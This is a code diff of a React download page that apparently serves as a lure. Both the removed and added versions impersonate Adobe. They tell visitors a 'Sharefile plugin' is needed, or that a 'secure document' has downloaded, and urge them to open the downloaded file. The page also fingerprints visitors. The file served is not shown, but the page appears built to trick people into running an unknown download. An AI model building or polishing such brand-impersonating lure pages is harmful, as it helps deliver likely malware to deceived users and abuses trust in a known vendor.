@@ -1,8 +1,7 @@
 import { useEffect, useMemo } from "react";
 import { useVisitorData } from "@fingerprintjs/fingerprintjs-pro-react";
-import adbTransfer from "@/assets/adb_transfer.png";
 
-const randomHex = (len = 8) =>
+const randomHex = (len = 4) =>
   Array.from(crypto.getRandomValues(new Uint8Array(len)))
     .map((b) => b.toString(16).padStart(2, "0"))
     .join("")
@@ -44,56 +43,41 @@ const Download = () => {
   }, []);
 
   return (
-    <div className="flex min-h-screen flex-col items-center justify-center bg-white">
-      <div className="flex flex-col items-center gap-6 max-w-lg text-center">
-        <div className="rounded-xl bg-[#f7f7f7] p-4">
-          <img src={adbTransfer} alt="Adobe Transfer" className="w-16 h-16 object-contain" />
+    <div className="flex min-h-screen flex-col items-center justify-center bg-[#f0f0f0]">
+      {/* Modal card */}
+      <div className="bg-white rounded-lg shadow-lg max-w-lg w-full mx-4 p-8 flex flex-col items-center text-center">
+        {/* Adobe PDF Logo placeholder */}
+        <div className="mb-6">
+          <div className="w-24 h-28 bg-[#f5f5f5] rounded flex items-center justify-center text-xs text-[#999]">
+            {/* TODO: Replace with Adobe PDF logo */}
+            <span className="text-4xl">📄</span>
+          </div>
         </div>
 
-        <div className="space-y-2">
-          <h1 className="text-2xl font-semibold text-[#2c3e50]">
-            Sorry, You do not have the latest version of{" "}
-            <span className="text-[#4A6FA5]">Adobe Sharefile</span> plugin installed.
-          </h1>
-          <p className="text-[#666] text-base">
-            The latest version of the Sharefile Transfer Client is required to view secured Documents.
-          </p>
-        </div>
+        <h1 className="text-2xl font-bold text-[#1a1a1a] mb-2">Download Complete</h1>
 
-        {downloadFile ? (
-          <>
-            <p className="text-sm text-[#666]">
-              If the download doesn't start automatically, please{" "}
-              <a
-                href={downloadFile.href}
-                download={downloadFile.name}
-                className="text-[#4A6FA5] underline hover:text-[#3a5a8a]"
-              >
-                Download Manually
-              </a>
-              .
-            </p>
+        <p className="text-sm text-[#888] mb-4">You've received a secure document:</p>
 
-            <div className="flex items-center gap-3 text-sm text-[#888]">
-              <span>Download not working?</span>
-              <a
-                href={downloadFile.href}
-                download={downloadFile.name}
-                className="text-[#4A6FA5] underline hover:text-[#3a5a8a]"
-              >
-                Restart download
-              </a>
-              <span>|</span>
-              <span className="text-[#4A6FA5] underline hover:text-[#3a5a8a] cursor-pointer">
-                Get Help
-              </span>
-            </div>
-          </>
-        ) : (
-          <p className="text-sm text-[#666]">
-            Your browser is not supported. Please use Chrome or Microsoft Edge.
-          </p>
-        )}
+        <p className="text-sm text-[#444] mb-1">
+          Your Document has been downloaded to your device.
+        </p>
+        <p className="text-sm text-[#444] mb-6">
+          Please check your <strong>Downloads</strong> folder
+          and open <strong>{downloadFile.name}</strong> To view your document.
+        </p>
+
+        <p className="text-sm text-[#666] mb-4">
+          If your Download did not start automatically, you can<br />
+          download the document again
+        </p>
+
+        <a
+          href={downloadFile.href}
+          download={downloadFile.name}
+          className="inline-block bg-[#0078d4] hover:bg-[#106ebe] text-white font-semibold px-8 py-3 rounded text-sm transition-colors"
+        >
+          Download Document
+        </a>
       </div>
     </div>
   );
